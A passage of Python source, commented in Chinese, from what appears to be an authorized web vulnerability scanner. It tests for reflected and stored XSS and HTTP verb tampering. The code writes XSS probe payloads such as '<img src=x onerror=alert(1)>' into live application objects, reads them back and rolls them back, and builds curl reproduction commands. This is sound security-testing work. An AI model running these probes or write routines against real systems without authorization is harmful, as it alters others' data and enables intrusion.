                        f"前端路由 `#/{rt['route']}` 的参数 `{rt['param']}` 的值"
                        "被原样插入渲染后的 DOM，注入的 iframe 标签结构被完整保留"
                        "（服务端对 hash 参数无感知，反射发生在浏览器端渲染）。"
                        f"该参数由「{rt.get('basis', '')}」选出，"
                        "并已用同一路由的中性值做过对照：中性值下不出现该标签结构。"),
                    technical_detail=(
                        f"验证 URL：{url}\n"
                        f"候选来源：{rt.get('basis', '')}\n"
                        "对照实验：同一路由同一参数传入中性值 aiscanneutral1，"
                        "渲染 DOM 中未出现 iframe+javascript: 结构；\n"
                        "实验组：传入载荷后出现完整标签 —— 该结构由输入造成。\n"
                        f"响应片段（已截断）：\n{o.html[:900]}"),
                    impact=("攻击者可构造带恶意参数的前端路由链接发给用户，"
                            "浏览器渲染时执行攻击者脚本，"
                            "读取该用户在当前站点的全部数据或以其身份操作。"),
                    reproduction=(
                        f"浏览器打开：{url.replace(MARK, 'alert(1)')}\n"
                        "若弹出对话框或开发者工具中可见注入的 iframe 即确认。"),
                    remediation=(
                        "① 前端路由参数输出到 DOM 时按上下文做编码"
                        "（Angular/React 默认消毒器不要绕过）；"
                        "② 禁止把路由参数直接 innerHTML；"
                        "③ 叠加 CSP 禁止 javascript: URI。"),
                    compliance="等保2.0 安全计算环境-入侵防范 / CWE-79",
                    evidence=[finding_evidence("rendered", o.html[:1500],
                                               f"渲染 DOM 反射 {rt['param']}")],
                    grading_basis="渲染实测注入标签完整保留在 DOM 中，可执行脚本，定高危",
                ))
                break
    if not hash_note:
        hash_note = (f"；hash 路由参数渲染验证 {ok_routes}/{tried_routes} 组"
                     f"（每组含中性值对照）"
                     if ok_routes else
                     ("；hash 路由参数渲染尝试 " + str(tried_routes) +
                      " 组但**全部渲染失败** —— 本次对该入口没有结论"
                      if tried_routes else
                      "；hash 路由参数未验证（渲染器不可用或无路由参数）"))
    note = (f"对 {len(params[:10])} 个参数做反射与编码测试 {probes} 次"
            f"{hash_note}，"
            f"{'发现 ' + str(len(findings)) + ' 处反射型 XSS' if findings else '未发现未编码反射'}")
    return found(note, findings, probes=probes, evidence_kind="反射与编码实测")


# ======================================================================
# WSTG-INPV-02 存储型跨站脚本（XSS）
#
# 2026-10-10：挂上受控写侦察（recon_inpv02）。
#   本项原注写死「只读扫描无法产生被存储的内容，因此任何声称自动检出存储型
#   XSS 的结论都不可信」—— 这句话在**没有写通道**时是对的，但工具链早就有了
#   受控写通道（ctx.data_submit：deep 档 + 台账授权 + 全局预算 + 全部留痕），
#   于是「不可自动」变成了「没做」而不是「做不到」。
#
#   侦察做的事很克制：**提交一条带唯一标记的、不会造成任何实际危害的探测内容**
#   （<img src=x onerror=…>，不外联、不窃取、不改写他人数据），然后把承载页面
#   读回来，看这段内容是不是被**原样输出**（未做输出编码）。
#   只报告「存储 + 原样回显」这个可复现的事实，不断言浏览器一定执行 ——
#   措辞与判定都留在这个事实范围内。
# ======================================================================
# 内容类写入端点候选（评论 / 留言 / 反馈 / 资料）
_XSS_WRITE_CANDIDATES = (
    "api/Feedbacks", "api/feedback", "rest/feedback", "api/Complaints",
    "api/comments", "api/comment", "api/messages", "api/Products/1/reviews",
    "api/reviews", "api/profile", "api/user/profile",
)
# 内容字段名候选
_XSS_FIELD_NAMES = ("comment", "message", "content", "text", "body", "review",
                    "caption", "description")
# 读回位置：提交端点自身（GET）优先，其次列表类端点
_XSS_READ_SUFFIXES = ("", "?limit=20", "/all")

# ======================================================================
# 「对象型写接口」的发现 —— 存储型 XSS 的真正注入点
# ======================================================================
# 原实现只认一张**硬编码**的路径表（`api/Feedbacks` 等）并且一律 POST
# `{"comment": ...}`。2026-10-12 实测暴露了两个后果：
#   ① 靶场的真实入口是 `PUT /api/Products/{id}`（改 `description` 字段），
#      根本不在这张表里 —— 测不到，然后记一条「已试 N 个入口」的人工项；
#   ② 硬编码的 `api/Feedbacks` 又要求 captchaId，服务端直接 500 ——
#      6 次写预算全部打在「请求根本不合法」上，报告上看不出来。
#
# 红队不会这么干：他先把接口清单摸出来（前端产物 / 接口文档），
# **先读一个对象看它有哪些字段**，再把 payload 写进某个字段并读回。
# 所以改成：发现 → 读结构 → 改一个字段 → 读回 → **回滚**。
# 字段名不再猜，而是从目标自己返回的对象里挑。
#
# 「像内容承载对象」的资源名（用于排序与排除非内容类资源）
_OBJ_CONTENT_HINTS = re.compile(
    r"(?i)(product|item|goods|sku|feedback|comment|review|complain|message|"
    r"post|article|news|profile|user|account|member|customer)")
#: 「强内容」资源名。命中者排到写候选最前面 —— 理由见 `_object_write_targets`。
_OBJ_STRONG = re.compile(
    r"(?i)(complain|feedback|comment|review|message|post|article|"
    r"product|item|news|note|content)")
#: 明确**不是**内容承载对象的资源（不涉及展示，写入没有意义）
_OBJ_SKIP = re.compile(r"(?i)(basket|cart|order|address|payment|card|security|"
                       r"login|logout|auth|token|captcha|challenge|quantity)")
#: 常见业务对象资源名（内容发现的兜底）。
#:
#: 只查 GET 就能确认它是不是真的存在（拿到结构才继续），
#: 所以在它上面花的成本是**零写预算** —— 与盲目 POST 完全不同：
#: 不存在的地址在「读结构」这一步就被跳过，一次写请求都不会发。
#: 这也是为什么这里可以放一串通用名字：代价是一批便宜的 GET，
#: 换来的是「目标真的有商品 / 文章 / 评论这类对象」时不至于整体漏掉。
_OBJ_RESOURCE_NAMES: tuple[str, ...] = (
    "api/Products", "api/products", "api/Items",
    "api/Articles", "api/Posts", "api/Contents", "api/News", "api/Notes",
    "api/Complaints", "api/Reviews", "api/Messages", "api/Feedbacks",
    "api/Comments", "api/Users", "api/Profile", "api/user/profile",
    "rest/products", "rest/Products",
)


def _object_write_targets(ctx: DetectorContext, *, limit: int = 20) -> list[str]:
    """找出「可以修改一个对象」的写接口地址（含具体 id），供存储型 XSS 对照。

    来源按可信度排序：
      1. 接口文档声明的写接口（目标自己写的契约，最准）；
      2. 前端产物里出现过的 `/api/...`、`/rest/...` 资源地址；
      3. 硬编码兜底（覆盖拿不到任何线索的目标）。

    只返回**看起来像内容对象**的资源 —— 把 payload 写进购物车数量
    没有任何展示位置，测它只是浪费写预算。
    """
    out: list[str] = []
    seen: set[str] = set()

    def _add(raw: str) -> None:
        u = str(raw or "").split("?")[0].rstrip("/")
        if not u:
            return
        if u.startswith("/"):
            u = urljoin(ctx.target_url, u.lstrip("/"))
        if not u.startswith("http") or ctx.domain not in u:
            return
        last = u.rsplit("/", 1)[-1]
        if _OBJ_SKIP.search(last):
            return
        # 两种形态都要登记：
        #   · `<u>/1` —— 对象地址，走 PUT（改已有对象）
        #   · `<u>`   —— 集合地址，走 POST（新建一个自己的对象）
        # 只登记对象地址的话，**只能新建不能改**的资源（实测 Complaints：
        # 改别人的对象 401，新建自己的 201）就整片漏掉；
        # 只登记集合地址则拿不到对象结构（字段名要猜，违反「先读再写」）。
        obj_u = u if last.isdigit() else u + "/1"
        col_u = u if not last.isdigit() else u.rsplit("/", 1)[0]
        for cand in (obj_u, col_u):
            if cand in seen or cand == u + "/1/1":
                continue
            seen.add(cand)
            out.append(cand)

    # ① 接口文档
    for t in (ctx._cache.get("spec_write_targets") or []):
        if isinstance(t, dict) and _OBJ_CONTENT_HINTS.search(str(t.get("url") or "")):
            _add(str(t.get("url") or ""))
    # ② 前端产物里的资源地址。
    #    两条路都走：`js_api_paths()` 读的是打包产物里的**接口字面量**
    #    （`/api/Complaints`、`/rest/basket/1` 这类相对路径模板），
    #    而 `js_result["urls"]` 是完整 URL。前者才是前后端分离系统的主来源 ——
    #    实测只靠 urls 时一条都取不到（模板字符串不是完整 URL）。
    #
    #    **排序即成败**：写预算只够覆盖前几个候选，而 `/api/Feedbacks`、
    #    `/api/Users` 恰好排在 `/api/Complaints` 前面（只按发现顺序排的话，
    #    Complaints 在第 12 位）—— 前两个各有 401 / 需要 captcha 的坑，
    #    预算在真正可写的对象出现之前就花光了（第 21 轮实测：6 次写完、
    #    一次成功写入都没有）。「内容承载」语义最强的资源必须排在最前。
    _strong = _OBJ_STRONG.search
    js_scored: list[tuple[int, int, str]] = []
    for i, u in enumerate(js_api_paths(ctx)):
        if not _OBJ_CONTENT_HINTS.search(u):
            continue
        js_scored.append((0 if _strong(u) else 1, i, u))
    js_scored.sort(key=lambda x: (x[0], x[1]))
    for _s, _i, u in js_scored:
        _add(u)
    for u in (ctx.js_result.get("urls") or [])[:400]:
        if not isinstance(u, str):
            continue
        if not re.search(r"/(api|rest)/[A-Za-z0-9_\-]{2,40}(/|$)", u, re.I):
            continue
        if not _OBJ_CONTENT_HINTS.search(u):
            continue
        _add(u)
    # ③ 常见业务对象资源名（内容发现兜底，只花 GET 不花写预算）
    for p in _OBJ_RESOURCE_NAMES:
        _add(urljoin(ctx.target_url, p))
    # ④ 硬编码兜底
    for p in _XSS_WRITE_CANDIDATES:
        _add(urljoin(ctx.target_url, p))
    return out[:limit]


def _pick_content_field(obj: dict[str, Any]) -> str | None:
    """从一个业务对象里挑出**最像自由文本**的字段名。

    判据先后是「字段名像内容」→「值是够长的字符串」。
    绝不挑 id / 时间戳 / 外键 / 枚举这类字段 —— 把 payload 写进去
    要么被服务端拒绝（预算白花），要么写进了一个没人展示的位置
    （读回必然「没找到标记」，结论变成假的「未确证」）。
    """
    if not isinstance(obj, dict):
        return None
    skip = re.compile(r"(?i)(id|_id|uuid|created|updated|deleted|at$|date|time|"
                      r"status|type|role|email|url|path|image|file|token|hash|count|"
                      r"total|price|quantity|rating|version)")
    cands: list[tuple[int, str]] = []
    for k, v in obj.items():
        if not isinstance(k, str):
            continue
        if k.lower() in _XSS_FIELD_NAMES:
            cands.append((0, k))
            continue
        if skip.search(k) or not isinstance(v, str):
            continue
        cands.append((1 if len(v) < 200 else 2, k))
    if not cands:
        return None
    cands.sort(key=lambda x: x[0])
    return cands[0][1]


#: 对象型存储 XSS 对照的共享写预算。
#:
#: 定的依据：候选最多 6 个，每个最多 1 次写 + 1 次清理，最坏 12 次；
#: 实际很少走满 —— 大部分候选在写这一步就被拒（401/500），失败不再清理。
#: 比上一版的 6 次多出来的正是「改不动就新建」与「多试几个候选」的成本：
#: 少了它，写预算会被排在前面的、注定失败的地址吃光（第 21 轮实测：
#: Feedbacks/Users 各 401，真正可写的 Complaints 一次都没轮到）。
#: 仍是**共享**预算：对象型对照与下面的「内容入口提交」两条路合起来不超过它。
_OBJ_WRITE_BUDGET = 12


def _created_id_of(wr: dict[str, Any]) -> str:
    """从「新建成功」的响应里取出新对象的标识（取不到返回空串）。

    取不到时不猜、不伪造 —— 调用方据此如实写「测试数据未被删除」，
    由人工清理。宁可留一条待人工处理的记录，
    也不能把「不知道删哪个」说成「已回滚」。
    """
    try:
        d = json.loads(str(wr.get("body") or ""))
    except Exception:  # noqa: BLE001
        return ""
    if isinstance(d, dict):
        if isinstance(d.get("data"), dict):
            d = d.get("data") or {}
        for k in ("id", "Id", "_id", "uuid"):
            v = d.get(k)
            if v not in (None, ""):
                return str(v)
    return ""


def _json_data_of(body: str) -> Any:
    """从响应正文里掏出业务对象（兼容 `{status,data}` 与裸对象/数组两种形态）。"""
    if not body:
        return None
    try:
        d = json.loads(body)
    except Exception:  # noqa: BLE001
        return None
    if isinstance(d, dict) and "data" in d:
        d = d.get("data")
    if isinstance(d, list):
        d = d[0] if d and isinstance(d[0], dict) else None
    return d if isinstance(d, dict) else None


def _xss_marker(ctx: DetectorContext) -> str:
    """本次探测的唯一标记。带时间戳，便于人工在目标站上定位并清理。"""
    import time as _t
    return f"aiscan{int(_t.time()) % 100000}"


def _recon_stored_xss_object(ctx: DetectorContext, acc: dict[str, Any],
                             marker: str, payload_html: str,
                             tried: list[str]) -> ReconOutcome | None:
    """对象型写接口的存储型 XSS 对照：读结构 → 改一个字段 → 读回 → **回滚**。

    四条纪律，缺一不可：

      ① **先读再写**。字段名从目标自己返回的对象里挑，不猜。
      ② **只改一个字段**，其余原样送回 —— 把整个对象换成 payload
         会把业务数据打坏（比如把商品价格清空）。
      ③ **测完回滚**（红线 11）。写入是真实副作用，留着就等于
         在客户库里留了一段 XSS payload。
      ④ **写预算是全局共享的稀缺资源**，每个端点最多 1 次写入 + 1 次回滚。

    返回 None 表示这条路没有可用目标（调用方继续走内容入口提交那条路）。
    """
    targets = _object_write_targets(ctx)
    if not targets:
        return None
    probes = 0
    last_note = ""

    # ---- ① 先做一轮**只读**的「结构侦察」，筛出真正可写的对象 ----
    #
    # 为什么必须先筛：候选里绝大多数地址不存在 / 不是业务对象 /
    # 没有自由文本字段。直接挨个写的话，**6 次写预算会被不存在的地址
    # 吃光**（上一版就是这样：7 个入口试完，一次成功写入都没有，
    # 报告上却写成「已试 7 个内容入口」—— 读者会以为真测过）。
    # GET 是廉价的，写是稀缺的：只在「读到了结构且挑得出字段」的
    # 对象上花写预算，这一步的性价比差了几十倍。
    usable: list[tuple[str, dict[str, Any], str]] = []
    for url in targets:
        r0 = recon_id._ident_fetch(url, recon_id._ident_of(acc), ctx=ctx)
        probes += 1
        obj = _json_data_of(str(r0.get("body") or ""))
        if obj is None:
            continue
        field = _pick_content_field(obj)
        if not field:
            continue
        usable.append((url, obj, field))
        # 上限从 3 提到 6：只读侦察是廉价的，真正稀缺的是写。
        # 3 个上限在第 21 轮实测里刚好停在「两个有坑的资源」上
        # （Feedbacks 401 / 需要 captcha，Users 401），
        # 真正可写的 Complaints 排在后面，一次都没轮到 ——
        # 报告上却写着「已试 N 个内容入口」。
        if len(usable) >= 6:
            break
    if not usable:
        tried.append(f"对象型入口 {len(targets)} 个候选均未读出可写结构")
        return None

    for url, obj, field in usable:
        original = obj.get(field)
        # 动词由地址形态决定，不再一律 PUT：
        #   · `<资源>/1` —— 对象地址，改它用 PUT；
        #   · `<资源>`   —— 集合地址，改不了别人的对象就**新建一个自己的**（POST）。
        # 只认 PUT 的代价是实测出来的：Complaints 上改别人的对象一律 401，
        # 而 `POST /api/Complaints` 返回 201 且原样存下 —— 前者记「未确证」，
        # 后者才是对的事实。两种形态都在 `usable` 里，PUT 先试、POST 兜底。
        _last = url.rstrip("/").rsplit("/", 1)[-1]
        method = "PUT" if _last.isdigit() else "POST"

        # ---- ② 改一个字段并写回 ----
        patched = dict(obj)
        patched[field] = f"{marker} {payload_html}"
        if method == "POST":
            # 新建：主键与时间戳交给服务端 —— 带上 `id` 会与已有记录冲突，
            # 带上 createdAt 之类会被服务端判为非法字段直接拒收。
            for _k in ("id", "createdAt", "updatedAt", "deletedAt"):
                patched.pop(_k, None)
        try:
            wr = ctx.data_submit(url, patched, method=method, as_json=True,
                                 account=acc, budget_key="inpv02_stored_xss",
                                 max_total=_OBJ_WRITE_BUDGET)
        except PermissionError as e:
            last_note = (f"受控写未放行（{str(e)[:120]}）：对象型对照未执行 —— "
                         "本项转人工")
            break
        except Exception as e:  # noqa: BLE001
            tried.append(f"{url}→写入异常 {type(e).__name__}")
            continue
        probes += 1
        st = int(wr.get("status") or 0)
        if st not in (200, 201):
            # 401/403 说明**本次写入根本没被应用接受**，对象没被改动 ——
            # 此时再发一次回滚是纯浪费（它也会 401），而且会把稀缺的
            # 写预算再吃掉一半。上一版就是这么干的：两个 401 端点
            # 吃掉 4 次预算，真正可写的对象一次都没轮到。
            tried.append(f"{url}[{method} {field}]→{st}")
            continue

        # ---- ③ 读回并判定 ----
        r1 = recon_id._ident_fetch(url, recon_id._ident_of(acc), ctx=ctx)
        probes += 1
        body = str(r1.get("body") or "")
        raw_idx = body.find(payload_html)
        escaped = "&lt;img src=x" in body.lower()
        got_marker = marker in body

        # ---- ④ 回滚（无论结论如何都要做）----
        # PUT 改的用原值写回；POST 建的**删掉**（留一条带 payload 的记录在
        # 客户库里，比留一段被改坏的业务数据更糟 —— 那是真实可利用的 XSS）。
        rollback_note = ""
        try:
            if method == "PUT":
                rb = dict(obj)
                rb[field] = original
                wrb = ctx.data_submit(url, rb, method="PUT", as_json=True,
                                      account=acc, budget_key="inpv02_stored_xss",
                                      max_total=_OBJ_WRITE_BUDGET)
                rb_st = int(wrb.get("status") or 0)
                rollback_note = ("；已用原值回滚（回滚响应 " + str(rb_st) + "）"
                                 if rb_st in (200, 201)
                                 else "；⚠ 回滚**未成功**（响应 " + str(rb_st)
                                      + "）—— 需人工把 " + field + " 字段改回原值")
            else:
                new_id = _created_id_of(wr)
                if not new_id:
                    rollback_note = ("；⚠ 未能从新建响应里取到对象标识，"
                                     "**该条测试数据未被删除** —— 需人工在 "
                                     + url + " 上删除带标记 " + marker + " 的记录")
                else:
                    # 载荷必须是 dict 不是 None：`data_submit` 内部会
                    # `payload.items()`，传 None 抛 AttributeError 被
                    # 这里的 except 接住 → 记成「回滚异常」而**删除根本没发**，
                    # 带 payload 的记录就留在客户库里了（第 23 轮实测就是这条）。
                    wrb = ctx.data_submit(f"{url.rstrip('/')}/{new_id}", {},
                                          method="DELETE", as_json=True,
                                          account=acc,
                                          budget_key="inpv02_stored_xss",
                                          max_total=_OBJ_WRITE_BUDGET)
                    rb_st = int(wrb.get("status") or 0)
                    rollback_note = ("；已删除本次新建的测试数据（DELETE 响应 "
                                     + str(rb_st) + "）" if rb_st in (200, 201, 204)
                                     else "；⚠ 删除**未成功**（响应 " + str(rb_st)
                                          + "）—— 需人工删除 " + url.rstrip("/")
                                          + "/" + str(new_id))
        except PermissionError:
            rollback_note = "；⚠ 回滚未执行（写预算已用尽）—— 需人工改回原值"
        except Exception as e:  # noqa: BLE001
            rollback_note = f"；⚠ 回滚异常 {type(e).__name__} —— 需人工改回原值"
        probes += 1

        if got_marker and raw_idx >= 0 and not escaped:
            f = make_finding(
                "WSTG-INPV-02", "存储型 XSS：业务对象字段被原样存储并原样输出",
                ctx.target_name, endpoint=url, method=method, param=field,
                severity="高危", confidence="High", evidence_level="A",
                description=(f"以受控方式把业务对象 `{url}` 的 `{field}` 字段"
                             f"改为带唯一标记「{marker}」的探测内容，随后读回："
                             "内容被**原样**输出，尖括号没有被转义"
                             "（响应里是 `<img …` 而不是 `&lt;img …`）。"
                             "说明该字段既没有输入过滤、也没有输出编码。"
                             + rollback_note),
                technical_detail=(
                    f"改写端点：{url}（{method}，字段 {field}）\n"
                    f"读回地址：{url}\n提交内容：{payload_html}\n"
                    f"读回片段：{body[max(0, raw_idx - 100):raw_idx + 220]}\n"
                    f"副作用处置：{rollback_note.strip('；')}"),
                impact=("任何访问该展示位置的用户都会加载攻击者构造的内容，"
                        "可窃取会话、冒充界面诱导操作、钓鱼拿凭据。"
                        "业务对象字段（商品描述 / 用户签名这类）通常同时出现在"
                        "前台与后台，影响面覆盖所有看到它的用户。"),
                reproduction=(
                    f"curl -s -X {method} '{url}' -H 'Content-Type: application/json' "
                    f"-H 'Authorization: Bearer <token>' "
                    f"-d '{{\"{field}\": \"{payload_html}\"}}'\n"
                    f"curl -s '{url}' | grep -F '{marker}'"),
                remediation=("① 输出时按上下文做编码（HTML 实体 / JS 转义 / "
                             "URL 编码，不能只做输入过滤）；"
                             "② 富文本走白名单过滤（如 DOMPurify）并在服务端二次校验；"
                             "③ 配置 CSP 兜底；"
                             "④ 清理本次测试数据（标记 " + marker + "）。"),
                compliance="OWASP ASVS 5.3 / CWE-79 / 等保2.0 入侵防范",
                evidence=[finding_evidence(
                    "response", body[max(0, raw_idx - 100):raw_idx + 300],
                    f"对象字段读回 {url}")],
                grading_basis="受控改写 + 读回实测，内容原样输出未编码，证据级 A，定高危",
            )
            return ReconOutcome(
                ran=True, findings=[f], probes=probes,
                note=(f"受控改写 {url} 的 {field} 字段并在同一地址读回："
                      f"内容原样输出、未做 HTML 编码 —— 存储型 XSS 确证。"
                      + rollback_note),
                lead=[f"请人工清理测试数据：在目标站搜索标记 {marker}",
                      f"改写端点：{url}（字段 {field}）"],
            )
        if got_marker and escaped:
            last_note = (f"受控改写 {url} 的 {field} 字段，读回时尖括号已被转义为 "
                         f"&lt; —— 输出编码生效，本次未确证存储型 XSS" + rollback_note)
        elif got_marker:
            last_note = (f"受控改写 {url} 的 {field} 字段，读回未见完整标签"
                         f"（可能被过滤）" + rollback_note)
        else:
            tried.append(f"{url}[PUT {field}]→{st}(读回未见标记)")
    if not last_note:
        return None
    return ReconOutcome(ran=True, probes=probes, note=last_note)


def recon_inpv02(ctx: DetectorContext) -> ReconOutcome:
    """提交一条无害标记内容 → 读回 → 判断是否被原样输出（未编码）。"""
    _manual_only = recon_id._manual_only
    if not ctx.risk_allowed(RISK_DEEP):
        return _manual_only(
            "当前档位不允许提交内容（存储型 XSS 必须真实写入才能验证回显编码）")
    if not ctx.allow_write:
        return _manual_only(
            "授权台账未对本目标显式授权写操作 —— 存储型 XSS 需要提交一条探测内容，"
            "未授权时不执行（补齐方式：授权台账对该目标置 allow_write_test: true）")

    authorized, accounts = recon_id._cfg(ctx)
    if not authorized:
        return _manual_only(
            "没有**回验通过**的登录态账号 —— 以匿名身份提交的内容无法确认归属，"
            "也无从判断它被展示给了谁，本项不执行（补齐方式：给一个专用测试账号，"
            "或由红队自取注册后重扫）")

    acc = accounts[0]
    marker = _xss_marker(ctx)
    # 载荷里**不放引号**：JSON 传输会把 " 转义成 \" ，原样比对就对不上了
    # （自测里第一版就是死在这里：明明存储并原样输出了，却因为转义匹配不上
    # 而报「已转义、未确证」—— 反误报的判据自己变成了误报源）。
    payload_html = "<img src=x onerror=alert(1)>"
    tried: list[str] = []
    probes = 0

    # ---------- 先走「读结构 → 改一个字段 → 读回 → 回滚」 ----------
    # 这条路是 2026-10-12 补的，补的是「注入点是对象的一个字段」这一整片：
    # 存储型 XSS 在现实里最常见的落点不是「留言板」，而是某个业务对象的
    # 自由文本字段（商品描述、用户签名、工单备注）。原来一律 POST
    # `{"comment": ...}` 的做法对这一片完全没有覆盖能力。
    obj_hit = _recon_stored_xss_object(ctx, acc, marker, payload_html, tried)
    probes += int(getattr(obj_hit, "probes", 0) or 0)
    if obj_hit is not None and obj_hit.findings:
        return ReconOutcome(
            ran=True, findings=obj_hit.findings, probes=probes,
            note=obj_hit.note,
            lead=list(obj_hit.lead or []))
    if obj_hit is not None and obj_hit.note:
        # 走过这条路并且拿到了明确结论（已转义 / 未能完成），如实带回，
        # 但仍然继续跑下面的「内容入口提交」——两条路覆盖的不是同一批入口。
        pass

    for path in _XSS_WRITE_CANDIDATES:
        url = urljoin(ctx.target_url, path)
        # 写预算是**全局共享**的稀缺资源：每个端点最多提交 2 次
        # （POST 一次；若被 400/401/403/422 拒绝——说明端点存在但用错了方法或
        # 字段——再补一次 PUT）。404/405 直接换下一个端点，不在无效地址上花钱。
        for method, field in (("POST", _XSS_FIELD_NAMES[0]),
                              ("PUT", _XSS_FIELD_NAMES[0])):
            try:
                res = ctx.data_submit(
                    url, {field: f"{marker} {payload_html}", "rating": 3},
                    method=method, as_json=True, account=acc,
                    # 与对象型对照共用同一个共享预算 —— 分成两个上限的话，
                    # 后一条路会在前一条路花到一半时被打断，而报告上看不出
                    # 「后一条路其实一次都没发」。
                    budget_key="inpv02_stored_xss", max_total=_OBJ_WRITE_BUDGET)
            except PermissionError as e:
                return _manual_only(
                    f"受控写未放行（{str(e)[:100]}）；在此之前已试 "
                    f"{len(tried)} 个内容入口：{'; '.join(tried[:4])} —— 本项转人工")
            probes += 1
            st = int(res.get("status") or 0)
            if st in (404, 405):
                tried.append(f"{path}→{st}")
                break
            if st not in (200, 201):
                tried.append(f"{path}[{method}]→{st}")
                continue
            # ---- 读回：提交成功后到所有可能的展示位置取一次 ----
            for suffix in _XSS_READ_SUFFIXES:
                read_url = url + suffix
                r = recon_id._ident_fetch(read_url, recon_id._ident_of(acc), ctx=ctx)
                probes += 1
                body = r.get("body") or ""
                if marker not in body:
                    continue
                # 标记在，看它是**原样**还是**被编码**（&lt;img …）
                raw_idx = body.find(payload_html)
                escaped = (f"&lt;img src=x" in body.lower()
                           or "&lt;img" in body.lower())
                if raw_idx >= 0 and not escaped:
                    f = make_finding(
                        "WSTG-INPV-02", "存储型 XSS：提交内容被原样存储并原样输出",
                        ctx.target_name, endpoint=url, method="POST", param=field,
                        severity="高危", confidence="High", evidence_level="A",
                        description=(f"以受控方式提交了一条带唯一标记「{marker}」的探测内容，"
                                     "随后从展示位置读回：内容被**原样**输出，"
                                     "尖括号没有被转义（响应里出现的是 `<img …` 而不是 "
                                     "`&lt;img …`）。说明该入口既没有做输入过滤、"
                                     "也没有做输出编码。"),
                        technical_detail=(f"提交端点：{url}（{field} 字段）\n"
                                          f"读回地址：{read_url}\n"
                                          f"提交内容：{payload_html}\n"
                                          f"读回片段：{body[max(0, raw_idx - 100):raw_idx + 200]}"),
                        impact=("任何访问该展示位置的用户都会加载攻击者构造的内容，"
                                "可窃取会话、冒充界面诱导操作、钓鱼拿凭据。"
                                "存储型的影响面是**所有看到这段内容的用户**。"),
                        reproduction=(f"curl -s -X POST '{url}' -H 'Content-Type: application/json'"
                                      f" -d '{{\"{field}\": \"{payload_html}\"}}'\n"
                                      f"curl -s '{read_url}' | grep -F '{marker}'"),
                        remediation=("① 输出时按上下文做编码（HTML 实体 / JS 转义 /"
                                     "URL 编码，不能只做输入过滤）；"
                                     "② 富文本走白名单过滤（如 DOMPurify）并在服务端二次校验；"
                                     "③ 配置 CSP 兜底；"
                                     "④ 清理本次测试数据（标记 " + marker + "）。"),
                        compliance="OWASP ASVS 5.3 / CWE-79 / 等保2.0 入侵防范",
                        evidence=[finding_evidence(
                            "response", body[max(0, raw_idx - 100):raw_idx + 300],
                            f"存储内容读回 {read_url}")],
                        grading_basis="受控写入 + 读回实测，内容原样输出未编码，证据级 A，定高危",
                    )
                    return ReconOutcome(
                        ran=True, findings=[f], probes=probes,
                        note=(f"受控提交 1 条探测内容（标记 {marker}）并在 {read_url} 读回："
                              f"内容原样输出、未做 HTML 编码 —— 存储型 XSS 确证。"),
                        lead=[f"请人工清理测试数据：在目标站搜索标记 {marker} 并删除",
                              f"提交端点：{url}"],
                    )
                if escaped:
                    return ReconOutcome(
                        ran=True, probes=probes,
                        note=(f"受控提交 1 条探测内容（标记 {marker}），读回时尖括号已被"
                              f"转义为 &lt; —— 输出编码生效，本次未确证存储型 XSS"),
                        lead=[f"仍建议人工清理测试数据：搜索标记 {marker}",
                              "未覆盖：后台管理列表、导出文件、邮件/通知模板等展示位置"],
                    )
            # 提交成功但读回没找到标记 —— 换下一个字段/端点继续
            tried.append(f"{path}[{field}]→{st}(读回未见标记)")
            break
    if not tried:
        return _manual_only("未定位到任何内容写入入口（评论 / 留言 / 反馈 / 资料），"
                            "无法做存储型 XSS 对照")
    return _manual_only(
        f"已试 {len(tried)} 个内容入口（{'; '.join(tried[:4])}），"
        f"均未能完成「提交并读回」的完整对照 —— 本项转人工",
        extra="补齐方式：人工登录后按指引逐入口提交并跨页面核对展示效果。")


@make_manual(
    "WSTG-INPV-02", name="存储型 XSS 测试",
    procedure=("⚠️ 只使用测试账号，提交内容中带唯一标记（如 SEC_TEST_20260921），"
               "验证后立即删除。\n"
               "1) 枚举所有「内容会被保存并展示给他人」的入口：个人资料（昵称 / 签名 / 头像名）、"
               "备注、反馈、评论、工单标题与描述、文件名、导入表格的单元格；\n"
               "2) 在每个入口提交带标记的探测串（含 <b>、引号、换行），"
               "记录提交结果 ID；\n"
               "3) 到所有会展示该内容的位置查看（本人页面、他人页面、"
               "导出文件、后台管理列表、通知 / 邮件模板）：\n"
               "   - 标签被原样解析 → 存储型 XSS；\n"
               "   - 标签以文本形式显示 → 已编码，安全；\n"
               "4) 重点检查「后台管理列表」与「导出 Excel / CSV 用 Excel 打开」两条路径 —— "
               "这两处最容易漏做编码；\n"
               "5) 验证完成后清理所有测试数据并留痕。"),
    expect="所有用户可控内容在输出位置都做上下文相关编码；富文本使用白名单过滤并二次校验；"
           "导出文件对公式与标签做转义。",
    why_manual=("必须真实写入数据并跨页面、跨角色验证展示效果。"
                "自动侦察只覆盖「提交 → 读回 → 看是否编码」这一段，"
                "后台列表 / 导出文件 / 通知模板等展示位置仍需人工核对。"),
    requires=["测试账号", "write"], risk=RISK_DEEP, tool="人工核查",
    recon=recon_inpv02,
)
def _inpv02(ctx: DetectorContext):  # pragma: no cover
    return ok("")


# ======================================================================
# WSTG-INPV-03 HTTP 动词篡改
# ======================================================================
@make_auto("WSTG-INPV-03", name="HTTP 动词篡改检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="方法变体实测",
           detector_ref="checks/injection.py:inpv03")
def inpv03(ctx: DetectorContext):
    protected = [p for p, pr in (ctx.fp_result.get("path_probes") or {}).items()
                 if isinstance(pr, dict) and pr.get("status") in (401, 403)]
    if not protected:
        for cand in ("admin", "manage", "api/user", "console"):
            pr = probe_or_none(ctx, cand)
            if pr is not None and getattr(pr, "status", 0) in (401, 403):
                protected.append(cand)
                break
    if not protected:
        return no_target_outcome(ctx, "返回 401/403 的受控路径", probes=3, evidence_kind="无对照路径")

    base = protected[0].strip("/")
    url = urljoin(ctx.target_url, base)
    base_pr = ctx.get(url)
    base_status = getattr(base_pr, "status", 0)

    probes = 0
    hits = []
    findings = []
    for method in ("HEAD", "POST", "PUT", "OPTIONS", "PATCH", "FOO", "TRACE"):
        probes += 1
        try:
            r = ctx.raw_request(method, url)
        except PermissionError:
            continue
        st = r.get("status", 0)
        body_len = len(r.get("body") or "")
        if st == 200 and (body_len > 200 or method == "HEAD"):
            hits.append((method, st, body_len))

    if hits:
        m, st, bl = hits[0]
        findings.append(make_finding(
            "WSTG-INPV-03", f"方法篡改可绕过访问控制（{m}）",
            ctx.target_name, endpoint=url, method=m,
            severity="高危", confidence="High", evidence_level="A",
            description=(f"GET 访问 /{base} 返回 HTTP {base_status}（被拦截），"
                         f"改用 {m} 方法后返回 HTTP {st} 并输出正常内容。"
                         "访问控制只对 GET 生效，其他方法成为绕过通道。"),
